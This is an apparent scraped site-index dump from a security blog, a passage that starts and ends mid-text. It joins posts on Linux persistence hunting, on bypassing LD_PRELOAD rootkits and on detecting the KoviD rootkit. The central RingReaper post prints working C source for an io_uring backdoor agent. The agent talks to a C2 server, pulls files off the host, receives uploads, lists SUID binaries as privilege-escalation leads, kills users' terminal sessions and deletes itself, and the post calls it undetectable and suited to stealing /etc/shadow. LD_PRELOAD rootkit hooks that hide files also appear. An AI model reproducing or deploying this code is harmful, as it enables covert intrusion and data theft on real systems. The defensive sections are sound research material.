can also see when it was run using systemctl status rc-local.\nTo be able to hunt, just check these files and directories:\n/etc/rc.local /lib/systemd/system/rc-local.service.d cat /run/systemd/generator/multi-user.target.wants/rc-local.service systemctl status rc-local So this was the post, I hope you liked it, if you have any questions or if you didn\u0026rsquo;t understand any part, DM me on Twitter: @MatheuzSecurity\nSo that\u0026rsquo;s it, until next time!\n","permalink":"http://localhost:1313/hacking/linux-threat-hunting-persistence/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/lM0kWBM.jpeg\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eHello everyone, welcome to this post, where I will cover the topic “Linux Threat Hunting Persistence”.\u003c/p\u003e\n\u003cp\u003eThe objective of this post is to learn how to hunt for persistence on Linux machines, without using paid tools/framework, just using the tools that are already available (open source) for anyone to download and use and also using Linux\u0026rsquo;s own resources to be able to do hunt for persistence.\u003c/p\u003e\n\u003cp\u003eBelow is what we will cover in this post.\u003c/p\u003e","title":"Linux Threat Hunting Persistence"},{"content":"Full source: https://github.com/MatheuZSecurity/RingReaper\nTable of Contents Introduction What is io_uring? The Agent Code Analysis How Does the EDR Typically Fail Here? Practical EDR Bypass Python C2 Server Flow Defensive Reflections Conclusion Introduction Each year, new security solutions emerge to protect Linux systems against increasingly sophisticated threats. Technologies such as EDR (Endpoint Detection and Response) evolve rapidly, making the work of an attacker more challenging.\nWe, as red teamers, we need to stay one step ahead, seeking to understand not only the defenses, but also how to creatively circumvent them.\nIn this article, I will explore the use of io_uring, a legitimate Linux kernel feature designed for high-performance asynchronous I/O, but which can be adapted to evade traditional syscall-based detection mechanisms. We will see how modern techniques can enable stealthy and silent operations, bypassing EDR and other monitoring mechanisms, and what this means for both attackers and defenders.\nWhat is io_uring? io_uring was introduced in Linux starting from kernel 5.1. It provides a highly performant model for asynchronous I/O operations, using submission and completion rings. In other words:\nThe process places I/O requests into a queue shared with the kernel The kernel executes them when it can, without blocking the user thread The result comes back through another completion ring The critical point is that this model allows for multiple operations (opening a file, sending data, reading from a socket, etc.) without the typical sequence of blocking syscalls that most EDRs monitor. Instead of repeatedly calling read, write, send, connect, everything happens through io_uring_submit() and mapped buffers.\nThe Agent This agent essentially acts as a \u0026ldquo;backdoor\u0026rdquo;, though it\u0026rsquo;s not persistent yet, at the time of writing, persistence modules haven\u0026rsquo;t been implemented. However, they will be added in the future. The agent connects to a server (C2) controlled by the attacker and accepts commands. It was designed with:\nNetwork communication using io_uring_prep_send and io_uring_prep_recv File reading via io_uring_prep_openat and io_uring_prep_read File upload without explicit write or read syscalls Post-exploitation command execution (listing users, processes, connections, etc.) Self-deletion (self-destruct) that removes its own binary using io_uring_prep_unlinkat On the Python-based C2 server, an operator sends interactive commands, and the agent responds discreetly.\nCode analysis of the agent send_all\nint send_all(struct io_uring *ring, int sockfd, const char *buf, size_t len) { size_t sent = 0; while (sent \u0026lt; len) { struct io_uring_sqe *sqe = io_uring_get_sqe(ring); io_uring_prep_send(sqe, sockfd, buf + sent, len - sent, 0); io_uring_submit(ring); struct io_uring_cqe *cqe; io_uring_wait_cqe(ring, \u0026amp;cqe); int ret = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (ret \u0026lt;= 0) return ret; sent += ret; } return sent; } This function ensures that a complete buffer is sent by a socket using asynchronous io_uring calls, in a way that is robust against partial sends. It works in a loop that continues until all requested bytes have been sent. For each iteration, it obtains an SQE (Submission Queue Entry) from io_uring, prepares a send (io_uring_prep_send) from the point not yet transmitted in the buffer, submits the operation, and waits for the result in the Completion Queue.\nUpon receiving confirmation from the kernel, it checks whether there was an error or whether the socket was closed (return zero or negative). If there was no error, it adds the sent bytes to the total and repeats until finished.\nThe goal is to abstract the normal limitations of the traditional send (which can send only part of the data) and perform the complete send with the minimum of blocking calls, taking advantage of the asynchronous and efficient io_uring model.\nrecv_all:\nssize_t recv_all(struct io_uring *ring, int sockfd, char *buf, size_t len) { struct io_uring_sqe *sqe = io_uring_get_sqe(ring); struct io_uring_cqe *cqe; io_uring_prep_recv(sqe, sockfd, buf, len, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); ssize_t ret = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); return ret; } This function reads data from a socket, also using io_uring asynchronously. Unlike send_all, it only reads once per call, since a recv is usually enough to receive the entire expected packet, without worrying about ensuring that the entire buffer has been filled.\nIt obtains the SQE, configures the receive operation (io_uring_prep_recv) with the buffer size, submits it to the kernel, and waits for the result via Completion Queue.\nIt then marks the CQE as processed and returns the number of bytes received to the caller. Thus, the function integrates data reception into the same asynchronous queue, maintaining high performance without blocking the thread.\nread_file_uring:\nThis function encapsulates the reading of an entire file using asynchronous io_uring operations, without relying on traditional blocking calls. It first opens the file with io_uring_prep_openat, waits for the result, and if successful, enters a loop to read chunks of the file in successive blocks, using io_uring_prep_read.\nEach block read is accumulated in a buffer, and the offset advances as it progresses. Reading continues until the buffer is full or until it reaches the end of the file (returning zero or negative on read). Finally, it closes the file and returns the total bytes loaded. It is a useful function to bring entire files into memory in a non-blocking way, always taking advantage of io_uring.\ncmd_users:\nvoid cmd_users(struct io_uring *ring, int sockfd) { char buf[8192]; int ret = read_file_uring(ring, \u0026#34;/var/run/utmp\u0026#34;, buf, sizeof(buf)); if (ret \u0026lt;= 0) { const char *err = \u0026#34;Error reading /var/run/utmp\\n\u0026#34;; send_all(ring, sockfd, err, strlen(err)); return; } int count = ret / sizeof(struct utmp); struct utmp *entries = (struct utmp*)buf; char out[8192]; size_t out_pos = 0; out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;Logged users:\\n\u0026#34;); for (int i = 0; i \u0026lt; count; i++) { if (entries[i].ut_type == USER_PROCESS) { out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;%-8s %-8s\\n\u0026#34;, entries[i].ut_user, entries[i].ut_line); if (out_pos \u0026gt; sizeof(out) - 100) break; } } send_all(ring, sockfd, out, out_pos); } This function implements the users command, listing the users logged into the system. It reads the /var/run/utmp file (where Linux stores login sessions) via read_file_uring, parses the USER_PROCESS records, extracts usernames and their TTYs (terminals), formats a list and sends it back to the client via send_all. It is a way to show who is logged in, remotely and asynchronously.\ncmd_ss:\nvoid cmd_ss(struct io_uring *ring, int sockfd) { char buf[8192]; int ret = read_file_uring(ring, \u0026#34;/proc/net/tcp\u0026#34;, buf, sizeof(buf)); if (ret \u0026lt;= 0) { const char *err = \u0026#34;Error reading /proc/net/tcp\\n\u0026#34;; send_all(ring, sockfd, err, strlen(err)); return; } char out[16384]; size_t out_pos = 0; out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;Local Address Remote Address State UID\\n\u0026#34;); char *line = strtok(buf, \u0026#34;\\n\u0026#34;); line = strtok(NULL, \u0026#34;\\n\u0026#34;); while (line) { unsigned int sl, local_ip, local_port, rem_ip, rem_port, st, uid; sscanf(line, \u0026#34;%u: %8X:%X %8X:%X %X %*s %*s %*s %u\u0026#34;, \u0026amp;sl, \u0026amp;local_ip, \u0026amp;local_port, \u0026amp;rem_ip, \u0026amp;rem_port, \u0026amp;st, \u0026amp;uid); char local_str[32], rem_str[32]; snprintf(local_str, sizeof(local_str), \u0026#34;%d.%d.%d.%d:%d\u0026#34;, (local_ip \u0026amp; 0xFF), (local_ip \u0026gt;\u0026gt; 8) \u0026amp; 0xFF, (local_ip \u0026gt;\u0026gt; 16) \u0026amp; 0xFF, (local_ip \u0026gt;\u0026gt; 24) \u0026amp; 0xFF, local_port); snprintf(rem_str, sizeof(rem_str), \u0026#34;%d.%d.%d.%d:%d\u0026#34;, (rem_ip \u0026amp; 0xFF), (rem_ip \u0026gt;\u0026gt; 8) \u0026amp; 0xFF, (rem_ip \u0026gt;\u0026gt; 16) \u0026amp; 0xFF, (rem_ip \u0026gt;\u0026gt; 24) \u0026amp; 0xFF, rem_port); out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;%-22s %-22s %-5X %u\\n\u0026#34;, local_str, rem_str, st, uid); if (out_pos \u0026gt; sizeof(out) - 100) break; line = strtok(NULL, \u0026#34;\\n\u0026#34;); } send_all(ring, sockfd, out, out_pos); } The cmd_ss function provides a sort of mini-netstat, reading /proc/net/tcp to collect active TCP connections. It skips the first line header and processes the rest via sscanf, converting hexadecimal addresses to decimal notation, displaying the IP, port, connection state, and UID of the socket owner. The final output is formatted as text and sent to the client with send_all, all in a way that looks like the real Linux ss command, but using asynchronous kernel file reading.\ncmd_get;\nvoid cmd_get(struct io_uring *ring, int sockfd, const char *path) { struct io_uring_sqe *sqe; struct io_uring_cqe *cqe; int fd; sqe = io_uring_get_sqe(ring); io_uring_prep_openat(sqe, AT_FDCWD, path, O_RDONLY, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); fd = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (fd \u0026lt; 0) { char err[256]; snprintf(err, sizeof(err), \u0026#34;Failed to open %s: %s\\n\u0026#34;, path, strerror(-fd)); send_all(ring, sockfd, err, strlen(err)); return; } char buf[BUF_SIZE]; ssize_t ret; off_t offset = 0; while (1) { sqe = io_uring_get_sqe(ring); io_uring_prep_read(sqe, fd, buf, sizeof(buf), offset); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); ret = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (ret \u0026lt;= 0) break; offset += ret; if (send_all(ring, sockfd, buf, ret) \u0026lt;= 0) { break; } } close(fd); } cmd_get is used to transfer files from the server to the client. It tries to open the specified path, and if successful, it reads blocks from the file with io_uring_prep_read and sends these blocks sequentially to the client with send_all. If it fails to open, it sends the client an error message. It is a way to download files from the server remotely.\ncmd_recv:\nvoid cmd_recv(struct io_uring *ring, int sockfd, const char *args) { char remote_path[256]; long expected_size = 0; char buf[BUF_SIZE]; if (sscanf(args, \u0026#34;%255s %ld\u0026#34;, remote_path, \u0026amp;expected_size) != 2 || expected_size \u0026lt;= 0) { const char *msg = \u0026#34;Usage: recv \u0026lt;remote_path\u0026gt; \u0026lt;size\u0026gt;\\n\u0026#34;; send_all(ring, sockfd, msg, strlen(msg)); return; } struct io_uring_sqe *sqe; struct io_uring_cqe *cqe; sqe = io_uring_get_sqe(ring); io_uring_prep_openat(sqe, AT_FDCWD, remote_path, O_WRONLY | O_CREAT | O_TRUNC, 0644); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); int fd = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (fd \u0026lt; 0) { char err[128]; snprintf(err, sizeof(err), \u0026#34;Failed to open %s: %s\\n\u0026#34;, remote_path, strerror(-fd)); send_all(ring, sockfd, err, strlen(err)); return; } off_t offset = 0; while (offset \u0026lt; expected_size) { size_t to_read = (expected_size - offset \u0026gt; BUF_SIZE) ? BUF_SIZE : (expected_size - offset); sqe = io_uring_get_sqe(ring); io_uring_prep_recv(sqe, sockfd, buf, to_read, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); ssize_t received = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (received \u0026lt;= 0) { break; } sqe = io_uring_get_sqe(ring); io_uring_prep_write(sqe, fd, buf, received, offset); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); io_uring_cqe_seen(ring, cqe); offset += received; } close(fd); } cmd_me:\nvoid cmd_me(struct io_uring *ring, int sockfd) { char buf[128]; pid_t pid = getpid(); char *tty = ttyname(STDIN_FILENO); if (!tty) tty = \u0026#34;(none)\u0026#34;; snprintf(buf, sizeof(buf), \u0026#34;PID: %d\\nTTY: %s\\n\u0026#34;, pid, tty); send_all(ring, sockfd, buf, strlen(buf)); } This command collects information about the running process, such as the PID and associated TTY, using traditional POSIX calls (getpid and ttyname), since io_uring does not support this. It then sends this data to the client using send_all. This is a way of “identifying” the remote agent.\ncmd_ps:\nvoid cmd_ps(struct io_uring *ring, int sockfd) { DIR *dir = opendir(\u0026#34;/proc\u0026#34;); if (!dir) { send_all(ring, sockfd, \u0026#34;Failed to open /proc\\n\u0026#34;, 21); return; } struct dirent *entry; char out[16384]; size_t pos = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;PID CMD\\n\u0026#34;); while ((entry = readdir(dir)) != NULL) { if (entry-\u0026gt;d_type != DT_DIR) continue; char *endptr; long pid = strtol(entry-\u0026gt;d_name, \u0026amp;endptr, 10); if (*endptr != \u0026#39;\\0\u0026#39;) continue; char comm_path[64]; snprintf(comm_path, sizeof(comm_path), \u0026#34;/proc/%ld/comm\u0026#34;, pid); char name[256]; int ret = read_file_uring(ring, comm_path, name, sizeof(name)); if (ret \u0026gt; 0) { name[strcspn(name, \u0026#34;\\n\u0026#34;)] = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;%-7ld %s\\n\u0026#34;, pid, name); if (pos \u0026gt; sizeof(out) - 100) break; } } closedir(dir); send_all(ring, sockfd, out, pos); } The cmd_ps function walks /proc to list active processes, identifying numerical directories (PIDs), and reading the command name of each process from /proc/[pid]/comm. Reading the process name is done using read_file_uring, but directory scanning does not use io_uring because it is not supported. The output is formatted into a PID + command listing, sent via send_all. It works like a remote “ps”.\ncmd_kick:\nvoid cmd_kick(struct io_uring *ring, int sockfd, const char *arg_raw) { char out[4096]; if (!arg_raw) arg_raw = \u0026#34;\u0026#34;; char *arg = (char *)arg_raw; trim_leading(\u0026amp;arg); if (strlen(arg) == 0) { DIR *d = opendir(\u0026#34;/dev/pts\u0026#34;); if (!d) { snprintf(out, sizeof(out), \u0026#34;Failed to open /dev/pts: %s\\n\u0026#34;, strerror(errno)); send_all(ring, sockfd, out, strlen(out)); return; } struct dirent *entry; size_t pos = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;Active pts sessions:\\n\u0026#34;); while ((entry = readdir(d)) != NULL) { if (entry-\u0026gt;d_name[0] \u0026gt;= \u0026#39;0\u0026#39; \u0026amp;\u0026amp; entry-\u0026gt;d_name[0] \u0026lt;= \u0026#39;9\u0026#39;) { pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;pts/%s\\n\u0026#34;, entry-\u0026gt;d_name); if (pos \u0026gt; sizeof(out) - 100) break; } } closedir(d); send_all(ring, sockfd, out, pos); return; } char target_tty[64]; snprintf(target_tty, sizeof(target_tty), \u0026#34;/dev/pts/%s\u0026#34;, arg); DIR *proc = opendir(\u0026#34;/proc\u0026#34;); if (!proc) { snprintf(out, sizeof(out), \u0026#34;Failed to open /proc: %s\\n\u0026#34;, strerror(errno)); send_all(ring, sockfd, out, strlen(out)); return; } int found_pid = 0; struct dirent *dent; while ((dent = readdir(proc)) != NULL) { char *endptr; long pid = strtol(dent-\u0026gt;d_name, \u0026amp;endptr, 10); if (*endptr != \u0026#39;\\0\u0026#39;) continue; char fd_path[256]; snprintf(fd_path, sizeof(fd_path), \u0026#34;/proc/%ld/fd\u0026#34;, pid); DIR *fd_dir = opendir(fd_path); if (!fd_dir) continue; struct dirent *fd_ent; while ((fd_ent = readdir(fd_dir)) != NULL) { if (fd_ent-\u0026gt;d_name[0] == \u0026#39;.\u0026#39;) continue; char link_path[512]; char link_target[512]; ssize_t link_len; snprintf(link_path, sizeof(link_path), \u0026#34;%s/%s\u0026#34;, fd_path, fd_ent-\u0026gt;d_name); link_len = readlink(link_path, link_target, sizeof(link_target) -1); if (link_len \u0026lt; 0) continue; link_target[link_len] = 0; if (strcmp(link_target, target_tty) == 0) { found_pid = (int)pid; break; } } closedir(fd_dir); if (found_pid) break; } closedir(proc); if (!found_pid) { snprintf(out, sizeof(out), \u0026#34;No process found using %s\\n\u0026#34;, target_tty); send_all(ring, sockfd, out, strlen(out)); return; } if (kill(found_pid, SIGKILL) == 0) { snprintf(out, sizeof(out), \u0026#34;Killed process %d using %s\\n\u0026#34;, found_pid, target_tty); } else { snprintf(out, sizeof(out), \u0026#34;Failed to kill process %d: %s\\n\u0026#34;, found_pid, strerror(errno)); } send_all(ring, sockfd, out, strlen(out)); } This command searches for open sessions in /dev/pts (virtual terminals) and, if the user wishes, forcibly kills a process that is using one of these terminals. It first lists the active terminals, then searches /proc for file descriptors that point to the target terminal, and sends a SIGKILL to the process that is using it. All this by combining POSIX calls (like readlink) and asynchronous sending with send_all.\ncmd_privesc:\nvoid cmd_privesc(struct io_uring *ring, int sockfd) { DIR *dir = opendir(\u0026#34;/usr/bin\u0026#34;); if (!dir) { send_all(ring, sockfd, \u0026#34;Failed to open /usr/bin\\n\u0026#34;, 23); return; } struct dirent *entry; char out[16384]; size_t pos = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;Potential SUID binaries:\\n\u0026#34;); while ((entry = readdir(dir)) != NULL) { char path[512]; snprintf(path, sizeof(path), \u0026#34;/usr/bin/%s\u0026#34;, entry-\u0026gt;d_name); struct io_uring_sqe *sqe = io_uring_get_sqe(ring); struct io_uring_cqe *cqe; struct statx stx; io_uring_prep_statx(sqe, AT_FDCWD, path, 0, STATX_ALL, \u0026amp;stx); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); if (cqe-\u0026gt;res == 0 \u0026amp;\u0026amp; (stx.stx_mode \u0026amp; S_ISUID)) { pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;%s\\n\u0026#34;, path); if (pos \u0026gt; sizeof(out) - 100) break; } io_uring_cqe_seen(ring, cqe); } closedir(dir); send_all(ring, sockfd, out, pos); } This function scans the /usr/bin directory looking for binaries that have the SUID bit enabled, which could be privilege escalation vectors (privesc). For each binary, it does a statx via io_uring and checks the SUID flag. The result is formatted and sent to the client, listing possible privilege exploit candidates.\ncmd_selfdestruct:\nvoid cmd_selfdestruct(struct io_uring *ring, int sockfd) { const char *msg = \u0026#34;Agent will self-destruct\\n\u0026#34;; send_all(ring, sockfd, msg, strlen(msg)); char exe_path[512]; ssize_t len = readlink(\u0026#34;/proc/self/exe\u0026#34;, exe_path, sizeof(exe_path)-1); if (len \u0026gt; 0) { exe_path[len] = \u0026#39;\\0\u0026#39;; struct io_uring_sqe *sqe = io_uring_get_sqe(ring); struct io_uring_cqe *cqe; io_uring_prep_unlinkat(sqe, AT_FDCWD, exe_path, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); if (cqe-\u0026gt;res \u0026lt; 0) { char err[128]; snprintf(err, sizeof(err), \u0026#34;Unlink failed: %s\\n\u0026#34;, strerror(-cqe-\u0026gt;res)); send_all(ring, sockfd, err, strlen(err)); } io_uring_cqe_seen(ring, cqe); } exit(0); } How Does the EDR Typically Fail Here? A standard EDR intercepts:\nCalls to open Calls to connect Calls to read and write This monitoring is usually done via hooks or eBPF. What this agent does is \u0026ldquo;bypass\u0026rdquo; these direct calls using io_uring. The kernel handles the I/O without exposing each syscall individually, generating far fewer events to be audited.\nIn essence, the EDR sees fewer \u0026ldquo;door knocks\u0026rdquo; because io_uring sends a batch of operations to the kernel and receives the responses in bulk. This strategy generates much less noise and makes it easier to go unnoticed.\nPractical EDR Bypass With this agent, virtually all network and file operations are handled through io_uring.\nSo an EDR would need to monitor io_uring_enter and understand the full submission/completion flow of events to identify behavior — which is still uncommon in most commercial solutions.\nAdditionally, the traffic goes through a standard HTTPS port (443), making it harder to separate legitimate from malicious traffic.\nBelow is a screenshot from an environment running EDR:\nRingReaper is currently completely FUD (Fully Undetectable) to some EDRs at the time of writing this article. You can do anything, exfiltrate data, read /etc/shadow, access sensitive files, upload content, all RingReaper features remain fully undetected by some EDRs, with evasion working flawlessly.\nPython C2 Server Flow The server.py is quite straightforward:\nWaits for a connection Receives commands from a terminal Sends them to the agent Displays the response It also supports file uploads (put), basically by informing the file size and sending the content sequentially, so the backdoor can reconstruct the file on the target.\nDefensive Reflections As much as using io_uring to bypass defenses is a clever idea;\nThere’s no magic:\nThe kernel still has to execute the io_uring operations. In theory, a well-designed EDR could hook io_uring_enter or instrument internal calls like __io_uring_submit.\neBPF (Berkeley Packet Filter) could be used to trace these operations, but the reality is that few products today deeply monitor io_uring-related syscalls.\nIt’s essential that defenders become familiar with this kind of technique, as it’s likely to become increasingly popular in advanced Linux malware.\nConclusion This agent demonstrates that io_uring, a legitimate Linux feature, can be repurposed to evade syscall-based security solutions.\nIts asynchronous control level enables the construction of discreet, fast, and much harder-to-detect backdoors.\nFor red teamers, t shows the power of modern evasion techniques.\nFor defenders, the takeaway is clear: start studying hooks for io_uring, because it’s only a matter of time before this becomes mainstream in the Linux malware landscape.\nJoin in rootkit researchers\nhttps://discord.gg/66N5ZQppU7 ","permalink":"http://localhost:1313/hacking/evading-linux-edrs-with-io-uring/","summary":"\u003cp\u003eFull source: \u003ca href=\"https://github.com/MatheuZSecurity/RingReaper\"\u003ehttps://github.com/MatheuZSecurity/RingReaper\u003c/a\u003e\u003c/p\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#what-is-io_uring\"\u003eWhat is io_uring?\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#the-agent\"\u003eThe Agent\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#code-analysis\"\u003eCode Analysis\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#how-does-the-edr-typically-fail-here\"\u003eHow Does the EDR Typically Fail Here?\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#practical-edr-bypass\"\u003ePractical EDR Bypass\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#python-c2-server-flow\"\u003ePython C2 Server Flow\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#defensive-reflections\"\u003eDefensive Reflections\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eEach year, new security solutions emerge to protect Linux systems against increasingly sophisticated threats. Technologies such as \u003ccode\u003eEDR (Endpoint Detection and Response)\u003c/code\u003e evolve rapidly, making the work of an attacker more challenging.\u003c/p\u003e\n\u003cp\u003eWe, as \u003cstrong\u003ered teamers\u003c/strong\u003e, we need to stay one step ahead, seeking to understand not only the defenses, but also how to creatively circumvent them.\u003c/p\u003e","title":"Red Team Tactics: Evading EDR on Linux with io_uring"},{"content":" Introduction In this post, I\u0026rsquo;m going to get into a really cool topic, which is how to bypass the hooks used by LD_PRELOAD rootkits, a technique that is effective against most, if not all, of them.\nLD_PRELOAD LD_PRELOAD is an environment variable used by dynamic linkers on Unix-like systems (such as /lib64/ld-linux-x86-64.so.2 on x86_64 Linux) to force specific shared libraries to be loaded before any others during program execution.\nThis technique allows you to \u0026ldquo;hook\u0026rdquo; functions from standard libraries, such as libc, without modifying the program binary, and is therefore widely used both for debugging and for offensive techniques such as user space rootkits.\nWhen an ELF binary is executed, the dynamic linker resolves external function calls using structures like the Procedure Linkage Table (PLT) and Global Offset Table (GOT). By preloading a custom library via LD_PRELOAD, attackers can override functions like readdir() or fopen().\nExample:\nLD_PRELOAD=./rootkitresearchers.so ls /etc/ld.so.preload\nBesides the environment variable, the /etc/ld.so.preload file can also be used to persistently load a library into all processes on the system (including root). This file is read before any environment variable.\nInstalling and Hiding Directory with Rootkit To demonstrate this, I\u0026rsquo;ll use a simple LD_PRELOAD rootkit that hooks the readdir, readdir64, and fopen functions to change the behavior of file and directory listings. The code is shown below.\nFull source\nstruct dirent *(*orig_readdir)(DIR *dirp); struct dirent *readdir(DIR *dirp) { if (!orig_readdir) orig_readdir = dlsym(RTLD_NEXT, \u0026#34;readdir\u0026#34;); struct dirent *entry; while ((entry = orig_readdir(dirp)) != NULL) { if (strcmp(entry-\u0026gt;d_name, HIDDEN_DIR) != 0 \u0026amp;\u0026amp; strcmp(entry-\u0026gt;d_name, HIDDEN_FILE) != 0) { return entry; } } return NULL; } This snippet above hooks into the readdir function, which is responsible for listing files in a directory. It uses a pointer orig_readdir to store the address of the original function, retrieved with dlsym(RTLD_NEXT, \u0026ldquo;readdir\u0026rdquo;). Then, in a loop, it calls the original function to get each entry in the directory, but filters out (ignores) entries whose name is equal to \u0026ldquo;secret\u0026rdquo; or \u0026ldquo;ld.so.preload\u0026rdquo;. Thus, these entries never appear to the program that called readdir. When there are no more visible entries, it returns NULL.\nstruct dirent64 *(*orig_readdir64)(DIR *dirp); struct dirent64 *readdir64(DIR *dirp) { if (!orig_readdir64) orig_readdir64 = dlsym(RTLD_NEXT, \u0026#34;readdir64\u0026#34;); struct dirent64 *entry; while ((entry = orig_readdir64(dirp)) != NULL) { if (strcmp(entry-\u0026gt;d_name, HIDDEN_DIR) != 0 \u0026amp;\u0026amp; strcmp(entry-\u0026gt;d_name, HIDDEN_FILE) != 0) { return entry; } } return NULL; } This is the same logic but for the 64-bit version readdir64.\nFILE *(*orig_fopen)(const char *pathname, const char *mode); FILE *fopen(const char *pathname, const char *mode) { if (!orig_fopen) orig_fopen = dlsym(RTLD_NEXT, \u0026#34;fopen\u0026#34;); if (strstr(pathname, HIDDEN_FILE) != NULL) { errno = ENOENT; return NULL; } return orig_fopen(pathname, mode); } This fopen hook hides access to specific files by returning a ‘file not found’ error (ENOENT) if the path contains keywords like ‘ld.so.preload’.\nNow let\u0026rsquo;s compile and load it into /etc/ld.so.preload\nOnce loaded, we can test creating a directory named secret, and see if it is hidden from ls.\nAs expected, it was hidden from ls.\n[Theory] Breaking LD_PRELOAD rootkits Here’s something interesting: rootkits that use the LD_PRELOAD technique depend ENTIRELY on the Linux dynamic loader (ld-linux.so) to \u0026ldquo;inject\u0026rdquo; their malicious libraries before the standard system libraries, such as libc. But does this work with all programs?\nThe short and quick answer is: No!\nWhy does LD_PRELOAD work, and why does it sometimes not work?\nLD_PRELOAD, as explained in previous topics, is an environment variable used by ld-linux.so to load extra libraries before others, which allows it to intercept functions from standard libraries (such as libc). In other words, you can replace system functions, such as those that list files or open files, with customized versions, which is perfect for hiding directories or files, for example.\nBut for this to work, the program has to use dynamic loading and depend on ld-linux.so to resolve these functions.\nWhy do static binaries break this idea?\nStatically linked binaries are \u0026ldquo;self-contained\u0026rdquo;. They incorporate all necessary code from their dependencies (such as libc) directly into the executable. As a result, they do not invoke the dynamic linker at runtime, so LD_PRELOAD and /etc/ld.so.preload are ignored.\nIn other words, LD_PRELOAD and the /etc/ld.so.preload file are simply not used by these binaries. This means that rootkits based on these techniques have no effect on them, practically useless.\nThis is one of the most effective ways to bypass these rootkits.\n[Practice] Breaking LD_PRELOAD rootkits With the rootkit loaded in /etc/ld.so.preload, the secret directory is hidden from commands like ls, which depend on libc and the dynamic loader.\nBut it is easy to bypass this, for example: just compile a static binary, like a simple getdents64.c\ngcc getdents64.c -o getdents64 \u0026ndash;static\nWhen using ldd getdents64, we will see that it does not load any dynamic dependencies, unlike ldd /bin/ls, which depends on libc. Since static binaries do not use the dynamic linker, LD_PRELOAD is completely ignored, and so is the rootkit.\nBypassing LD_PRELOAD rootkits is simply very easy.\nConclusion LD_PRELOAD rootkits are actually very good at hiding artifacts in user space, especially because of their simplicity and the fact that they are more stable than LKM rootkits. However, as we have shown in this post, they are not infallible. Simple techniques, such as the use of static binaries, can easily bypass the hooks applied by the rootkit, precisely because they do not depend on the dynamic loader and the external libc.\nIf you enjoyed this content and want to discuss similar techniques, feel free to join our Discord community. See you next time!\nRootkit Researchers\nhttps://discord.gg/66N5ZQppU7\n","permalink":"http://localhost:1313/hacking/bypass-userland-hooks/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/JhWCyVT.png\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this post, I\u0026rsquo;m going to get into a really cool topic, which is how to bypass the hooks used by LD_PRELOAD rootkits, a technique that is effective against most, if not all, of them.\u003c/p\u003e\n\u003ch2 id=\"ld_preload\"\u003eLD_PRELOAD\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003eLD_PRELOAD\u003c/code\u003e is an environment variable used by dynamic linkers on Unix-like systems (such as /lib64/ld-linux-x86-64.so.2 on x86_64 Linux) to force specific shared libraries to be loaded before any others during program execution.\u003c/p\u003e","title":"Bypassing LD_PRELOAD Rootkits Is Easy"},{"content":" Hello everyone, welcome to this post where I will cover the easiest way on how to detect and remove LKM KoviD rootkit.\nBut first of all, we need to understand how the KoviD works.\nWhat is KoviD? KoviD is a Linux kernel rootkit, containing several features that make it difficult to detect and remove, in my opinion KoviD is the best open source LKM rootkit today, you can see more about it on github.\nNow that we know what KoviD is, we can analyze its code and see how it works, for example, which hooking method it uses.\nFtrace hooking Looking at KoviD sys.c, we can see that it uses a very famous method for hooking syscalls that works very well on newer kernels, which is ftrace (function tracer).\nKeep this information, it will be very useful later in this post.\nSetup KoviD and Loading. According to the kovid readme, before compiling, we need to edit the Makefile to choose a unique file name for \u0026ldquo;/proc/name\u0026rdquo;.\nAfter compiling using make, we can insert it using insmod kovid.ko.\nAfter inserting it, we can see that /proc/mtz had not been enabled and also the module was not hidden after its insertion, so first it is necessary to enable /proc/mtz using kill -SIGCONT 31337 and after that, hide the LKM from lsmod using echo -h \u0026gt;/proc/mtz.\nI also hid the file containing the name mtz, making it invisible in /proc/.\nWell, after enabling /proc/mtz, we can look in dmesg that a random magic word was generated, and this magic word is used to 